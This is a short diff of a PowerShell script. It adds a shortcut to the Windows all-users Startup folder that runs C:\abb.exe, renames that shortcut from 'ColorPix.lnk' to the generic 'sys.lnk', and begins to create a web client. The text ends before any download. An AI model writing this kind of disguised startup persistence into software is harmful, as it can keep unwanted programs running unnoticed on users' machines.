@@ -1,6 +1,7 @@
 $WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ColorPix.lnk")
+$Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\sys.lnk")
 $Shortcut.TargetPath = "C:\abb.exe"
+$Shortcut.WorkingDirectory = "C:\"
 $Shortcut.Save()
 
 $webClient = New-Object System.Net.WebClient
